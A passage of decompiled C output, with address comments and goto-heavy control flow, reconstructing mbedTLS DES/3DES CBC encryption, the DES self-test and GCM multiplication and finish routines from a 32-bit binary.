                    char v10 = *(char *)(g7 + v9); // 0x806ba60
                    char v11 = *(char *)(v9 + v7); // 0x806ba64
                    *(char *)(v9 + v8) = v11 ^ v10;
                    int32_t v12 = v5 + 1; // 0x806ba6a
                    v5 = v12;
                    if (v12 == 8) {
                        // 0x806ba72
                        g5 += 8;
                        char * v13 = (char *)g3;
                        mbedtls_des3_crypt_ecb(a1, v13, v13);
                        *(int32_t *)g7 = *(int32_t *)g3;
                        *(int32_t *)(g7 + 4) = *(int32_t *)(g3 + 4);
                        int32_t v14 = g5; // 0x806ba92
                        if (v14 == v4) {
                            // break (via goto) -> 0x806ba97
                            goto lab_0x806ba97;
                        }
                        v6 = v14;
                        // continue (via goto) -> 0x806ba50
                        goto lab_0x806ba50;
                    } else {
                        // 0x806ba60
                        v8 = g3;
                        v9 = v12;
                        // branch -> 0x806ba60
                        continue;
                    }
                }
              lab_0x806ba97:
                // 0x806ba97
                // branch -> 0x806ba38
                // 0x806ba38
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
        } else {
            // 0x806b9e0
            g5 = 0;
            int32_t v15;
            int32_t v16 = &v15; // 0x806b9d2_0
            int32_t v17 = 0; // 0x806b9ea
            // branch -> 0x806b9e0
            while (true) {
                int32_t v18 = a5 - v17; // 0x806b9e6
                v5 = v18;
                g3 = a6 - v17;
                *(int32_t *)v16 = *(int32_t *)v18;
                *(int32_t *)(v16 + 4) = *(int32_t *)(v5 + 4);
                mbedtls_des3_crypt_ecb(a1, (char *)v5, (char *)g3);
                int32_t v19 = 0; // 0x806ba14
                unsigned char v20 = *(char *)(g7 + v19); // 0x806ba10
                g4 = v20;
                char * v21 = (char *)(g3 + v19); // 0x806ba14_0
                *v21 = *v21 ^ v20;
                int32_t v22 = 1; // 0x806ba17
                // branch -> 0x806ba10
                while (v22 != 8) {
                    // 0x806ba10
                    v19 = v22;
                    v20 = *(char *)(g7 + v19);
                    g4 = v20;
                    v21 = (char *)(g3 + v19);
                    *v21 = *v21 ^ v20;
                    v22++;
                    // continue -> 0x806ba10
                }
                // 0x806ba1f
                g5 -= 8;
                *(int32_t *)g7 = *(int32_t *)v16;
                *(int32_t *)(g7 + 4) = *(int32_t *)(v16 + 4);
                int32_t v23 = g5; // 0x806ba2f
                if (v23 + v4 == 0) {
                    // 0x806ba36
                    // branch -> 0x806ba38
                    // 0x806ba38
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return 0;
                }
                // 0x806ba1f
                v17 = v23;
                // branch -> 0x806b9e0
            }
        }
    }
    // 0x806ba38
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return -50;
}

// Address range: 0x806baa0 - 0x806bb8f
int32_t mbedtls_des_crypt_cbc(int32_t a1, int32_t a2, char a3, int32_t * a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x806baa8
    int32_t v2 = g7; // 0x806baa9
    int32_t v3 = g3; // 0x806baaa
    g7 = (int32_t)a4;
    int32_t v4 = a3;
    if (a3 == 7) {
        // 0x806bab7
        int32_t v5; // eax
        if (a2 == 1) {
            // 0x806bb40
            g5 = 0;
            int32_t v6 = 0; // 0x806bb4a
            // branch -> 0x806bb40
          lab_0x806bb40:
            while (true) {
                // 0x806bb40
                v5 = 0;
                int32_t v7 = v6 + a5; // 0x806bb48
                int32_t v8 = v6 + a6; // 0x806bb4a
                g3 = v8;
                int32_t v9 = 0; // 0x806bb57
                // branch -> 0x806bb50
                while (true) {
                    char v10 = *(char *)(g7 + v9); // 0x806bb50
                    char v11 = *(char *)(v9 + v7); // 0x806bb54
                    *(char *)(v9 + v8) = v11 ^ v10;
                    int32_t v12 = v5 + 1; // 0x806bb5a
                    v5 = v12;
                    if (v12 == 8) {
                        // 0x806bb62
                        g5 += 8;
                        char * v13 = (char *)g3;
                        mbedtls_des_crypt_ecb(a1, v13, v13);
                        *(int32_t *)g7 = *(int32_t *)g3;
                        *(int32_t *)(g7 + 4) = *(int32_t *)(g3 + 4);
                        int32_t v14 = g5; // 0x806bb82
                        if (v14 == v4) {
                            // break (via goto) -> 0x806bb87
                            goto lab_0x806bb87;
                        }
                        v6 = v14;
                        // continue (via goto) -> 0x806bb40
                        goto lab_0x806bb40;
                    } else {
                        // 0x806bb50
                        v8 = g3;
                        v9 = v12;
                        // branch -> 0x806bb50
                        continue;
                    }
                }
              lab_0x806bb87:
                // 0x806bb87
                // branch -> 0x806bb28
                // 0x806bb28
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
        } else {
            // 0x806bad0
            g5 = 0;
            int32_t v15;
            int32_t v16 = &v15; // 0x806bac2_0
            int32_t v17 = 0; // 0x806bada
            // branch -> 0x806bad0
            while (true) {
                int32_t v18 = a5 - v17; // 0x806bad6
                v5 = v18;
                g3 = a6 - v17;
                *(int32_t *)v16 = *(int32_t *)v18;
                *(int32_t *)(v16 + 4) = *(int32_t *)(v5 + 4);
                mbedtls_des_crypt_ecb(a1, (char *)v5, (char *)g3);
                int32_t v19 = 0; // 0x806bb04
                unsigned char v20 = *(char *)(g7 + v19); // 0x806bb00
                g4 = v20;
                char * v21 = (char *)(g3 + v19); // 0x806bb04_0
                *v21 = *v21 ^ v20;
                int32_t v22 = 1; // 0x806bb07
                // branch -> 0x806bb00
                while (v22 != 8) {
                    // 0x806bb00
                    v19 = v22;
                    v20 = *(char *)(g7 + v19);
                    g4 = v20;
                    v21 = (char *)(g3 + v19);
                    *v21 = *v21 ^ v20;
                    v22++;
                    // continue -> 0x806bb00
                }
                // 0x806bb0f
                g5 -= 8;
                *(int32_t *)g7 = *(int32_t *)v16;
                *(int32_t *)(g7 + 4) = *(int32_t *)(v16 + 4);
                int32_t v23 = g5; // 0x806bb1f
                if (v23 + v4 == 0) {
                    // 0x806bb26
                    // branch -> 0x806bb28
                    // 0x806bb28
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return 0;
                }
                // 0x806bb0f
                v17 = v23;
                // branch -> 0x806bad0
            }
        }
    }
    // 0x806bb28
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return -50;
}

// Address range: 0x806bbe0 - 0x806bbff
int32_t mbedtls_des3_init(char * a1) {
    // 0x806bbe0
    memset(a1, 0, 96);
    return 0;
}

// Address range: 0x806bc00 - 0x806bc1f
int32_t mbedtls_des_init(char * a1) {
    // 0x806bc00
    memset(a1, 0, 32);
    return 0;
}

// Address range: 0x806bc20 - 0x806c19e
int32_t mbedtls_des_self_test(int32_t a1) {
    int32_t v1 = a1;
    int32_t v2 = g5; // 0x806bc23
    int32_t v3 = g7; // 0x806bc24
    int32_t v4 = g3; // bp-16
    int32_t v5;
    int32_t v6 = &v5; // 0x806bc2c_0
    int32_t str;
    int32_t v7 = &str; // 0x806bc38_0
    g3 = v7;
    mbedtls_des_init((char *)&v5);
    int32_t v8;
    int32_t v9 = &v8; // 0x806bc43_0
    mbedtls_des3_init((char *)&v8);
    // branch -> 0x806bc5b
    for (uint32_t i = 0; i < 6; i++) {
        // 0x806bc5b
        g7 = a1;
        int32_t v10 = i / 2; // 0x806bc6a
        int32_t v11 = i % 2; // 0x806bc6a
        g5 = v10;
        if (a1 != 0) {
            char * v12 = v11 == 0 ? "dec" : "enc";
            int32_t v13 = i < 2 ? 32 : 51; // 0x806bc9a
            printf("  DES%c-ECB-%3d (%s): ", (char)v13, 56 * v10 + 56, v12);
            // branch -> 0x806bcb1
        }
        // 0x806bcb1
        str = 0x20776f4e;
        int32_t v14; // 0x806c01b
        int32_t v15;
        int32_t v16;
        int32_t v17;
        int32_t v18;
        int32_t v19; // 0x806c008
        int32_t v20; // 0x806bfa862
        int32_t v21; // 0x806bf2e81
        int32_t v22; // 0x806bf3489
        int32_t v23; // 0x806bfd054
        switch (i) {
            default: {
                // 0x806bcce
                mbedtls_des_setkey_dec(&v5, (int32_t)(char)&g139);
                // branch -> 0x806bce8
                break;
            }
            case 1: {
                // 0x806c0a1
                mbedtls_des_setkey(v6, (char *)(int32_t)(char)&g139);
                // branch -> 0x806bce8
                break;
            }
            case 2: {
                // 0x806c086
                mbedtls_des3_set2key_dec(v9, (int32_t)(char)&g139);
                // branch -> 0x806bce8
                break;
            }
            case 3: {
                // 0x806c06b
                mbedtls_des3_set2key_enc(v9, (int32_t)(char)&g139);
                // branch -> 0x806bce8
                break;
            }
            case 4: {
                // 0x806c050
                mbedtls_des3_set3key_dec(v9, (int32_t)(char)&g139);
                // branch -> 0x806bce8
                break;
            }
            case 5: {
                // 0x806c0bc
                mbedtls_des3_set3key_enc(v9, (int32_t)(char)&g139);
                // branch -> 0x806bce8
                break;
            }
            case 11: {
                // 0x806c143
                mbedtls_des3_set3key_enc(v9, (int32_t)(char)&g139);
                v22 = v15;
                v21 = v16;
                v17 = 11;
                v20 = v11;
                v23 = v18;
                // branch -> 0x806be40
              lab_0x806be40_10:
                // 0x806be40
                g7 = 0;
                int32_t v24; // 0x806c00b
                int32_t v25; // edx
                int32_t result; // 0x806c030_2
                int32_t str2;
                uint32_t strncmp_rc;
                int32_t v26; // 0x806c018
                int32_t v27; // 0x806c02c
                int32_t v28; // 0x806c01b
                int32_t v29; // 0x806bf2e80
                int32_t v30; // 0x806bf3488
                int32_t v31; // 0x806bfb096
                int32_t v32; // 0x806bfc9
                if (g5 == 0) {
                  lab_0x806be4a:
                    // 0x806be4a
                    g5 = v20;
                    int32_t v33 = 0; // 0x806be5b
                    int32_t v34 = v20; // 0x806be90
                    // branch -> 0x806be90
                    while (true) {
                        // 0x806be90
                        g7 = v33 + 1;
                        int32_t v35;
                        int32_t v36; // 0x806be88
                        if (v34 != 0) {
                            int32_t v37 = g3; // 0x806bea0
                            mbedtls_des3_crypt_cbc(v9, 0, 8, &v35, v37, v37);
                            int32_t v38 = g7; // 0x806bec4
                            if (v38 != 0x2710) {
                                v36 = v38;
                                goto lab_0x806be90;
                            }
                            // 0x806becc
                            str2 = 8 * v20 + (int32_t)&g140;
                            // branch -> 0x806bfba
                          lab_0x806bfba_2:
                            // 0x806bfba
                            g5 = str2;
                            g7 = v7;
                            strncmp_rc = strncmp((char *)&str, (char *)str2, 8);
                            g237 = strncmp_rc % 2 == 0;
                            v32 = v1;
                            if (strncmp_rc % 2 == 0) {
                              lab_0x806bfc9:
                                // 0x806bfc9
                                if (v32 != 0) {
                                    // 0x806c042
                                    puts("passed");
                                    // branch -> 0x806bfd0
                                }
                                int32_t v39 = v23 + 1; // 0x806bfd0
                                if (v39 == 6) {
                                    // 0x806bfe4
                                    g1 = 0;
                                    if (v1 != 0) {
                                        // 0x806bfec
                                        putchar(10);
                                        g1 = 0;
                                        // branch -> 0x806bffa
                                    }
                                    // 0x806bffa
                                    v25 = v6;
                                    v19 = v6;
                                    // branch -> 0x806c008
                                    while (true) {
                                        // 0x806c008
                                        *(char *)v19 = 0;
                                        v24 = v25 + 1;
                                        v25 = v24;
                                        if (v24 == v17) {
                                            // break (via goto) -> 0x806c012
                                            goto lab_0x806c012;
                                        }
                                        v19 = v24;
                                        // continue -> 0x806c008
                                    }
                                    // 0x806c012
                                    v25 = v9;
                                    v26 = v9;
                                    // branch -> 0x806c018
                                    while (true) {
                                        // 0x806c018
                                        *(char *)v26 = 0;
                                        v28 = v25;
                                        v14 = v28 + 1;
                                        v25 = v14;
                                        if (v14 == v6) {
                                            // break (via goto) -> 0x806c026
                                            goto lab_0x806c026;
                                        }
                                        v26 = v14;
                                        // continue -> 0x806c018
                                    }
                                    // 0x806c026
                                    v27 = v4;
                                    g3 = v27;
                                    g7 = v3;
                                    g5 = v2;
                                    result = g1;
                                    return result;
                                }
                                int32_t v40 = v17;
                                // 0x806bd98
                                g7 = v1;
                                int32_t v41 = v39 / 2; // 0x806bda7
                                int32_t v42 = v39 % 2; // 0x806bda7
                                g5 = v42;
                                if (v1 != 0) {
                                    char * v43 = v42 == 0 ? "dec" : "enc";
                                    int32_t v44 = v39 < 2 ? 32 : 51; // 0x806bdd9
                                    printf("  DES%c-CBC-%3d (%s): ", (char)v44, 56 * v41 + 56, v43);
                                    // branch -> 0x806bdf0
                                }
                                // 0x806bdf0
                                v35 = 0x78563412;
                                str = 0x20776f4e;
                                switch (v39) {
                                    default: {
                                        // 0x806be24
                                        mbedtls_des_setkey_dec(&v5, (int32_t)(char)&g139);
                                        v22 = -0x10325470;
                                        v21 = 0x78563412;
                                        v17 = v40;
                                        v20 = v41;
                                        v23 = v39;
                                        // branch -> 0x806be40
                                        goto lab_0x806be40_10;
                                        break;
                                    }
                                    case 1: {
                                        // 0x806c128
                                        mbedtls_des_setkey(v6, (char *)(int32_t)(char)&g139);
                                        v22 = -0x10325470;
                                        v21 = 0x78563412;
                                        v17 = v40;
                                        v20 = v41;
                                        v23 = 1;
                                        // branch -> 0x806be40
                                        goto lab_0x806be40_10;
                                        break;
                                    }
                                    case 2: {
                                        // 0x806c10d
                                        mbedtls_des3_set2key_dec(v9, (int32_t)(char)&g139);
                                        v22 = -0x10325470;
                                        v21 = 0x78563412;
                                        v17 = v40;
                                        v20 = v41;
                                        v23 = 2;
                                        // branch -> 0x806be40
                                        goto lab_0x806be40_10;
                                        break;
                                    }
                                    case 3: {
                                        // 0x806c0f2
                                        mbedtls_des3_set2key_enc(v9, (int32_t)(char)&g139);
                                        v22 = -0x10325470;
                                        v21 = 0x78563412;
                                        v17 = v40;
                                        v20 = v41;
                                        v23 = 3;
                                        // branch -> 0x806be40
                                        goto lab_0x806be40_10;
                                        break;
                                    }
                                    case 4: {
                                        // 0x806c0d7
                                        mbedtls_des3_set3key_dec(v9, (int32_t)(char)&g139);
                                        v22 = -0x10325470;
                                        v21 = 0x78563412;
                                        v17 = v40;
                                        v20 = v41;
                                        v23 = 4;
                                        // branch -> 0x806be40
                                        goto lab_0x806be40_10;
                                        break;
                                    }
                                    case 5: {
                                        // 0x806c143
                                        mbedtls_des3_set3key_enc(v9, (int32_t)(char)&g139);
                                        v22 = -0x10325470;
                                        v21 = 0x78563412;
                                        v17 = v40;
                                        v20 = v41;
                                        v23 = 5;
                                        // branch -> 0x806be40
                                        goto lab_0x806be40_10;
                                        break;
                                    }
                                }
                                // 0x806be40
                                g7 = 0;
                                int32_t v45 = g5; // 0x806be42
                                if (v45 == 0) {
                                    goto lab_0x806be4a;
                                }
                                // 0x806bf3f
                                v30 = v22;
                                v31 = 0x74207369;
                                v29 = v21;
                                // branch -> 0x806bf3f
                              lab_0x806bf3f:
                                while (true) {
                                    // 0x806bf3f
                                    if (v20 == 0) {
                                        int32_t v46 = g3; // 0x806bee9
                                        mbedtls_des_crypt_cbc(v6, 1, 8, &v35, v46, v46);
                                        // branch -> 0x806bf0d
                                    } else {
                                        int32_t v47 = g3; // 0x806bf52
                                        mbedtls_des3_crypt_cbc(v9, 1, 8, &v35, v47, v47);
                                        // branch -> 0x806bf0d
                                    }
                                    int32_t v48 = g7 + 1; // 0x806bf10
                                    g7 = v48;
                                    g5 = str;
                                    str = v29;
                                    *(int32_t *)v17 = v29;
                                    int32_t v49 = g5; // 0x806bf2e
                                    *(int32_t *)(v17 + 4) = v30;
                                    int32_t v50 = v30; // 0x806bf37
                                    if (v48 == 0x2710) {
                                        // break (via goto) -> 0x806bfa8
                                        goto lab_0x806bfa8;
                                    }
                                    v30 = v31;
                                    v31 = v50;
                                    v29 = v49;
                                    // continue -> 0x806bf3f
                                }
                              lab_0x806bfa8:
                                // 0x806bfa8
                                str = g5;
                                str2 = 8 * v20 + (int32_t)&g141;
                                // branch -> 0x806bfba
                                goto lab_0x806bfba_2;
                            } else {
                                // 0x806c188
                                if (v32 != 0) {
                                    // 0x806c18e
                                    puts("failed");
                                    g1 = 1;
                                    return 1;
                                }
                                // 0x806c17e
                                g1 = 1;
                                // branch -> 0x806bffa
                            }
                            // 0x806bffa
                            *(char *)v6 = 0;
                            v24 = v6 + 1;
                            // branch -> 0x806c008
                            while (v24 != v17) {
                                // 0x806c008
                                *(char *)v24 = 0;
                                v24++;
                                // continue -> 0x806c008
                            }
                            // 0x806c012
                            *(char *)v9 = 0;
                            v14 = v9 + 1;
                            // branch -> 0x806c018
                            while (v14 != v6) {
                                // 0x806c018
                                *(char *)v14 = 0;
                                v14++;
                                // continue -> 0x806c018
                            }
                            // 0x806c026
                            g3 = v4;
                            g7 = v3;
                            g5 = v2;
                            return g1;
                        }
                        int32_t v51 = g3; // 0x806be64
                        mbedtls_des_crypt_cbc(v6, 0, 8, &v35, v51, v51);
                        v36 = g7;
                        if (v36 != 0x2710) {
                          lab_0x806be90:
                            // 0x806be90
                            v33 = v36;
                            v34 = g5;
                            // branch -> 0x806be90
                            continue;
                        }
                        // 0x806becc
                        str2 = 8 * v20 + (int32_t)&g140;
                        // branch -> 0x806bfba
                        goto lab_0x806bfba_2;
                    }
                } else {
                    // 0x806bf3f
                    v30 = v22;
                    v31 = 0x74207369;
                    v29 = v21;
                    // branch -> 0x806bf3f
                    goto lab_0x806bf3f;
                }
                // 0x806bfba
                g5 = str2;
                g7 = v7;
                strncmp_rc = strncmp((char *)&str, (char *)str2, 8);
                g237 = strncmp_rc % 2 == 0;
                v32 = v1;
                if (strncmp_rc % 2 == 0) {
                    goto lab_0x806bfc9;
                }
                // 0x806c188
                if (v32 != 0) {
                    // 0x806c18e
                    puts("failed");
                    g1 = 1;
                    return 1;
                }
                int32_t v52 = v17;
                // 0x806c17e
                g1 = 1;
                int32_t v53 = v52;
                // branch -> 0x806bffa
                int32_t v54 = v53; // ecx
                v25 = v6;
                v19 = v6;
                *(char *)v19 = 0;
                int32_t v55 = v25; // 0x806c00b
                v24 = v55 + 1;
                v25 = v24;
                // branch -> 0x806c008
                while (v24 != v54) {
                    // 0x806c008
                    v19 = v24;
                    *(char *)v19 = 0;
                    v55 = v25;
                    v24 = v55 + 1;
                    v25 = v24;
                    // continue -> 0x806c008
                }
                // 0x806c012
                v25 = v9;
                v26 = v9;
                *(char *)v26 = 0;
                v28 = v25;
                v14 = v28 + 1;
                v25 = v14;
                // branch -> 0x806c018
                while (v14 != v6) {
                    // 0x806c018
                    v26 = v14;
                    *(char *)v26 = 0;
                    v28 = v25;
                    v14 = v28 + 1;
                    v25 = v14;
                    // continue -> 0x806c018
                }
                // 0x806c026
                v27 = v4;
                g3 = v27;
                g7 = v3;
                g5 = v2;
                result = g1;
                return result;
            }
            case 7: {
                // 0x806c128
                mbedtls_des_setkey(v6, (char *)(int32_t)(char)&g139);
                v22 = v15;
                v21 = v16;
                v17 = 7;
                v20 = v11;
                v23 = v18;
                // branch -> 0x806be40
                goto lab_0x806be40_10;
            }
            case 8: {
                // 0x806c10d
                mbedtls_des3_set2key_dec(v9, (int32_t)(char)&g139);
                v22 = v15;
                v21 = v16;
                v17 = 8;
                v20 = v11;
                v23 = v18;
                // branch -> 0x806be40
                goto lab_0x806be40_10;
            }
            case 9: {
                // 0x806c0f2
                mbedtls_des3_set2key_enc(v9, (int32_t)(char)&g139);
                v22 = v15;
                v21 = v16;
                v17 = 9;
                v20 = v11;
                v23 = v18;
                // branch -> 0x806be40
                goto lab_0x806be40_10;
            }
            case 10: {
                // 0x806c0d7
                mbedtls_des3_set3key_dec(v9, (int32_t)(char)&g139);
                v22 = v15;
                v21 = v16;
                v17 = 10;
                v20 = v11;
                v23 = v18;
                // branch -> 0x806be40
                goto lab_0x806be40_10;
            }
        }
        int32_t v56 = 0; // 0x806bcf6
        // branch -> 0x806bd11
        while (true) {
            // 0x806bd11
            if (g5 == 0) {
                // 0x806bcf0
                g7 = v56 + 1;
                int32_t v57 = g3; // 0x806bcf9
                mbedtls_des_crypt_ecb(v6, (char *)(0x1000000 * v57 / 0x1000000), (char *)v57);
                int32_t v58 = g7; // 0x806bd09
                if (v58 == 0x2710) {
                    // break -> 0x806bd36
                    break;
                }
                v56 = v58;
                // continue -> 0x806bd11
                continue;
            } else {
                // 0x806bd15
                g7 = v56 + 1;
                int32_t v59 = g3; // 0x806bd1e
                mbedtls_des3_crypt_ecb(v9, (char *)(0x1000000 * v59 / 0x1000000), (char *)v59);
                int32_t v60 = g7; // 0x806bd2e
                if (v60 == 0x2710) {
                    // break -> 0x806bd36
                    break;
                }
                v56 = v60;
                // continue -> 0x806bd11
                continue;
            }
            uint32_t v61;
            if (v61 % 2 != 0) {
                int32_t v62; // 0x806bd5a
                if (v62 != 0) {
                    // 0x806c18e
                    puts("failed");
                }
                // branch -> 0x806bffa
                // branch -> 0x806c008
                while (true) {
                    // 0x806c008
                    *(char *)v19 = 0;
                }
              lab_0x806c012:
                // 0x806c012
                *(char *)v9 = 0;
                v14 = v9 + 1;
                // branch -> 0x806c018
                while (v14 != v6) {
                    // 0x806c018
                    *(char *)v14 = 0;
                    v14++;
                    // continue -> 0x806c018
                }
              lab_0x806c026:
                // 0x806c026
                g3 = v4;
                g7 = v3;
                g5 = v2;
                return g1;
            }
            // 0x806bd5a
        }
    }
}

// Address range: 0x806c1b0 - 0x806c3af
int32_t gcm_mult(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1;
    int32_t v2 = &v1; // 0x806c1b0_0
    int32_t v3 = 15; // 0x806c288
    int32_t v4 = (int32_t)(*(char *)(g6 + 15) / 16); // 0x806c285
    // branch -> 0x806c282
    while (true) {
        int32_t v5 = v4 % 256; // 0x806c285
        int32_t v6 = v3 - 1; // ebx
        uint32_t v7 = *(int32_t *)(v2 - 56); // 0x806c28b
        int32_t v8 = *(int32_t *)(v2 - 64); // 0x806c28e
        *(int32_t *)(v2 - 72) = v5;
        uint32_t v9 = *(int32_t *)(v2 - 52); // 0x806c294
        *(int32_t *)(v2 - 68) = 0x10000000 * v9 | v7 / 16;
        uint32_t v10 = *(int32_t *)(v2 - 64); // 0x806c2a6
        uint32_t v11 = *(int32_t *)(v2 - 60); // 0x806c2a9
        *(int32_t *)(v2 - 20) = v11 / 16;
        int32_t v12 = v5 + 24; // edi
        *(int32_t *)(v2 - 24) = 0x10000000 * v11 | v10 / 16;
        uint32_t v13 = *(int32_t *)(v2 - 56); // 0x806c2be
        int32_t v14 = *(int32_t *)(g1 + 4 + 8 * v12); // 0x806c2c1
        *(int32_t *)(v2 - 28) = v14 ^ *(int32_t *)(v2 - 20);
        int32_t v15 = *(int32_t *)(8 * v12 + g1); // 0x806c2ce
        int32_t v16 = *(int32_t *)(8 * (v13 % 16) + (int32_t)&g156); // 0x806c2d1
        *(int32_t *)(v2 - 40) = v15 ^ *(int32_t *)(v2 - 24);
        int32_t v17 = *(int32_t *)(v2 - 28); // 0x806c2e1
        int32_t v18 = *(int32_t *)(v2 - 72) + 8; // 0x806c2e4
        g4 = v18;
        int32_t v19 = *(int32_t *)((8 * v18 | 4) + g1); // 0x806c2e7
        *(int32_t *)(v2 - 36) = v17 ^ 0x10000 * v16;
        int32_t v20 = *(int32_t *)(v2 - 68); // 0x806c2ee
        *(int32_t *)(v2 - 44) = v19 ^ (v9 / 16 | 0x10000000 * v8);
        *(int32_t *)(v2 - 48) = *(int32_t *)(8 * g4 + g1) ^ v20;
        if (v6 == -1) {
            int32_t v21 = *(int32_t *)(v2 - 80); // 0x806c306
            v12 = v21;
            *(char *)v21 = (char)(*(int32_t *)(v2 - 36) / 0x1000000);
            uint32_t v22 = *(int32_t *)(v2 - 36); // 0x806c30e
            *(char *)(v12 + 1) = (char)(v22 / 0x10000);
            uint32_t v23 = *(int32_t *)(v2 - 36); // 0x806c317
            *(char *)(v12 + 2) = (char)(v23 / 256);
            int32_t v24 = *(int32_t *)(v2 - 36); // 0x806c320
            *(char *)(v12 + 3) = (char)v24;
            uint32_t v25 = *(int32_t *)(v2 - 40); // 0x806c329
            *(char *)(v12 + 4) = (char)(v25 / 0x1000000);
            uint32_t v26 = *(int32_t *)(v2 - 40); // 0x806c336
            *(char *)(v12 + 5) = (char)(v26 / 0x10000);
            uint32_t v27 = *(int32_t *)(v2 - 40); // 0x806c343
            *(char *)(v12 + 6) = (char)(v27 / 256);
            *(char *)(v12 + 7) = *(char *)(v2 - 40);
            uint32_t v28 = *(int32_t *)(v2 - 44); // 0x806c354
            *(char *)(v12 + 8) = (char)(v28 / 0x1000000);
            uint32_t v29 = *(int32_t *)(v2 - 44); // 0x806c35d
            *(char *)(v12 + 9) = (char)(v29 / 0x10000);
            uint32_t v30 = *(int32_t *)(v2 - 44); // 0x806c366
            *(char *)(v12 + 10) = (char)(v30 / 256);
            int32_t v31 = *(int32_t *)(v2 - 44); // 0x806c36f
            *(char *)(v12 + 11) = (char)v31;
            uint32_t v32 = *(int32_t *)(v2 - 48); // 0x806c378
            *(char *)(v12 + 12) = (char)(v32 / 0x1000000);
            uint32_t v33 = *(int32_t *)(v2 - 48); // 0x806c385
            *(char *)(v12 + 13) = (char)(v33 / 0x10000);
            uint32_t result = *(int32_t *)(v2 - 48) / 256; // 0x806c395
            *(char *)(v12 + 14) = (char)result;
            *(char *)(v12 + 15) = *(char *)(v2 - 48);
            int32_t v34;
            g3 = v34;
            int32_t v35;
            g7 = v35;
            int32_t v36;
            g5 = v36;
            return result;
        }
        uint32_t v37 = *(int32_t *)(v2 - 44); // 0x806c1fb
        uint32_t v38 = *(int32_t *)(v2 - 48); // 0x806c1fe
        char v39 = *(char *)(v6 + *(int32_t *)(v2 - 76)); // 0x806c201
        *(char *)(v2 - 96) = v39;
        int32_t v40 = *(int32_t *)(v2 - 40); // 0x806c20f
        *(int32_t *)(v2 - 72) = v38 / 16 | 0x10000000 * v37;
        uint32_t v41 = *(int32_t *)(v2 - 40); // 0x806c219
        int32_t v42 = (int32_t)(*(char *)(v2 - 96) % 16); // 0x806c224
        *(int32_t *)(v2 - 28) = v42;
        uint32_t v43 = *(int32_t *)(v2 - 36); // 0x806c22a
        *(int32_t *)(v2 - 20) = v43 / 16;
        uint32_t v44 = *(int32_t *)(v2 - 48); // 0x806c236
        v12 = v42 + 24;
        *(int32_t *)(v2 - 24) = 0x10000000 * v43 | v41 / 16;
        int32_t v45 = *(int32_t *)(g1 + 4 + 8 * v12); // 0x806c242
        int32_t v46 = *(int32_t *)(8 * (v44 % 16) + (int32_t)&g156); // 0x806c249
        *(int32_t *)(v2 - 68) = v45 ^ *(int32_t *)(v2 - 20);
        int32_t v47 = *(int32_t *)(8 * v12 + g1); // 0x806c256
        *(int32_t *)(v2 - 64) = v47 ^ *(int32_t *)(v2 - 24);
        int32_t v48 = *(int32_t *)(v2 - 68); // 0x806c265
        *(int32_t *)(v2 - 60) = v48 ^ 0x10000 * v46;
        int32_t v49 = 8 * (*(int32_t *)(v2 - 28) + 8); // 0x806c272
        int32_t v50 = *(int32_t *)(v49 + g1); // 0x806c272
        int32_t v51 = *(int32_t *)(g1 + 4 + v49); // 0x806c275
        *(int32_t *)(v2 - 56) = v50 ^ *(int32_t *)(v2 - 72);
        *(int32_t *)(v2 - 52) = v51 ^ (0x10000000 * v40 | v37 / 16);
        v3 = v6;
        v4 = (int32_t)(*(char *)(v2 - 96) / 16);
        // branch -> 0x806c282
    }
}

// Address range: 0x806c3b0 - 0x806c3df
int32_t mbedtls_gcm_free(char * a1) {
    int32_t v1 = g3; // 0x806c3b3
    g3 = (int32_t)a1;
    mbedtls_cipher_free(a1, 0);
    *(char *)g3 = 0;
    int32_t result = g3 + 1; // 0x806c3d3
    // branch -> 0x806c3d0
    while (result != g3 + 388) {
        // 0x806c3d0
        *(char *)result = 0;
        result++;
        // continue -> 0x806c3d0
    }
    // 0x806c3da
    g3 = v1;
    return result;
}

// Address range: 0x806c3e0 - 0x806c56f
int32_t mbedtls_gcm_finish(int32_t a1, char * a2, int32_t a3) {
    int32_t v1 = g3; // 0x806c3e5
    g3 = a1;
    uint32_t v2 = *(int32_t *)(a1 + 320); // 0x806c3f8
    uint32_t v3 = *(int32_t *)(a1 + 332); // 0x806c401
    uint32_t v4 = *(int32_t *)(a1 + 328); // 0x806c40a
    if (a3 > 16) {
        // 0x806c471
        g3 = v1;
        return -20;
    }
    int32_t v5 = v2 / 0x20000000 | 8 * *(int32_t *)(a1 + 324); // 0x806c430
    int32_t v6 = 8 * v2; // 0x806c434
    int32_t v7 = v4 / 0x20000000 | 8 * v3; // 0x806c443
    int32_t v8 = 8 * v4; // 0x806c447
    int32_t v9 = a1 + 336; // 0x806c44d
    memcpy(a2, (char *)v9, a3);
    if (v8 == v7) {
        // 0x806c467
        if (v6 == v5) {
            // 0x806c46f
            // branch -> 0x806c471
            // 0x806c471
            g3 = v1;
            return 0;
        }
    }
    uint32_t v10 = v3 / 0x200000;
    int32_t v11 = 0x1000000 * (v10 % 256) / 0x1000000;
    char * v12 = (char *)(g3 + 368); // bp+060
    *v12 = (char)((int32_t)*v12 ^ v10);
    int32_t v13 = 1; // 0x806c53366
    int32_t v14; // 0x806c55b
    char * v15; // 0x806c558_0
    int32_t v16; // 0x806c53b
    int32_t v17; // 0x806c558
    if (v13 == 16) {
        // 0x806c53b
        v16 = g3;
        g6 = v16 + 368;
        g1 = v16;
        gcm_mult((int32_t)a2, v9, a3, 0, v6, v5, v8, v7);
        v17 = 0;
        v15 = (char *)(g7 + v17);
        *v15 = *v15 ^ *(char *)(v17 + 368 + g3);
        v14 = 1;
        // branch -> 0x806c550
        while (v14 != g5) {
            // 0x806c550
            v17 = v14;
            v15 = (char *)(g7 + v17);
            *v15 = *v15 ^ *(char *)(v17 + 368 + g3);
            v14++;
            // continue -> 0x806c550
        }
        // 0x806c562
        // branch -> 0x806c471
        // 0x806c471
        g3 = v1;
        return 0;
    }
    char v18 = *(char *)((int32_t)&v11 + v13); // 0x806c528
    char * v19 = (char *)(v13 + 368 + g3); // 0x806c52c_0
    *v19 = *v19 ^ v18;
    int32_t v20 = v13 + 1; // 0x806c533
    while (v20 != 16) {
        // 0x806c528
        v13 = v20;
